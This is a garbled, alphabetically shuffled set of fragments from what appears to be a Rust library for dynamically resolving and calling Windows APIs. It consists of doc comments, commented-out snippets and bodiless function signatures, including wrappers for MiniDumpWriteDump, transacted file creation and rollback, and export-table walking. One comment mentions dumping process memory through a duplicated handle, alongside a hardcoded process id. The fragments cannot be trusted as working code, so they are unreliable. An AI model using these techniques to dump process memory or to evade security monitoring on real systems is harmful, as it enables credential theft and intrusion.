"//
"//         Err(e) => println!(""{}"",e),"
"//         Ok(addr) => println!(""The address where RtlDispatchAPC is located at is 0x{:X}."", addr),"
// We use the duplicated handle to dump the process memory
// ```
// and PE headers.
// descriptive error message.
// fails the HANDLE will have value -1 or 0.
// fails the bool value returned will be false.
// function address of the specified module in the runtime by walking process structures 
// function's address is obtained by walking and parsing the EAT of the  
// if handle.0 != 0 && handle.0 != -1
// let fun_name: *mut String = ptr::null_mut();
// let function_ptr: LdrGetProcedureAddress;
// let function_ptr: data::LoadLibraryA;
// let hmodule: PVOID = std::mem::transmute(ptr);
// let module_name = PSTR{0: name.as_ptr() as *mut u8};
// let mut ret:Option<HINSTANCE>;
// let ordinal = 8 as u32;
// let pid = 792u32;
// let ret: Option<i32>;
// let ret: bool = false;
// let return_address: *mut PVOID = std::mem::transmute(return_address);
// let return_address: *mut c_void = std::mem::transmute(&u64::default());
// null byte
// offset 0x00
// offset 0x04
// offset 0x08
// offset 0x0C
// offset 0x10
// offset 0x14
// or by its ordinal number.
// or false (using the 3rd argument passed to the macro) depending on the success of the call.
// return 0.
// specified module.
// using the 4th argument passed to the macro.
// {
// }
/// # Example - Calling a dll entry point"
/// # Examples"
/// In case that the function's address can't be retrieved, it will return 0."
/// In case that the function's address can't be retrieved, it will return an Err with a "
/// In case that the module can't be found in the current process, it will"
/// In case that this macro is used to call a dll entry point (DllMain), it will return true"
/// It will return either a HANDLE object or an Err with a descriptive error message. If the function"
/// It will return either a boolean value or an Err with a descriptive error message. If the function"
/// It will return either the module's base address or an Err with a descriptive error message."
/// It will return the NTSTATUS value returned by the call."
/// This functions internally calls LdrGetProcedureAddress."
/// This functions is analogous to GetProcAddress from Win32. The exported "
/// This macro will use the dinvoke crate functions to obtain an exported"
/// ```"
/// ```ignore"
/// if ntdll != 0"
/// match ret {"
pub fn create_file_mapping (file: HANDLE, attributes: *const SECURITY_ATTRIBUTES, protect: u32, max_size_high: u32, max_size_low: u32, name: *mut u8) -> HANDLE {"
pub fn create_file_transacted(name: *mut u8, access: u32, mode: u32, attributes: *const SECURITY_ATTRIBUTES, disposition: u32, flags: u32, template: HANDLE, transaction: HANDLE, version: *const u32, extended: PVOID) -> HANDLE {"
pub fn create_transaction(attributes: *mut SECURITY_ATTRIBUTES,uow: *mut GUID, options: u32, isolation_level: u32, isolation_flags: u32, timeout: u32, description: *mut u16) -> HANDLE {"
pub fn get_file_size(handle: HANDLE, size: *mut u32) -> u32 {"
pub fn map_view_of_file (file: HANDLE, access: u32, off_high: u32, off_low: u32, bytes: usize) -> PVOID {"
pub fn mini_dump_write_dump (process: HANDLE, process_id: u32, file: HANDLE, dump_type: u32, exception: *mut MINIDUMP_EXCEPTION_INFORMATION, stream: *mut MINIDUMP_USER_STREAM_INFORMATION, callback: *mut MINIDUMP_CALLBACK_INFORMATION) -> i32 {"
pub fn query_full_process_image_name(process_handle: HANDLE, flags: u32, name: *mut u16, size: *mut u32) -> i32 {"
pub fn rollback_transaction(transaction: HANDLE) -> bool {"
pub fn set_handle_information (object: HANDLE, mask: u32, flags: u32) -> bool {"
pub fn unmap_view_of_file (base_address: PVOID) -> bool {"
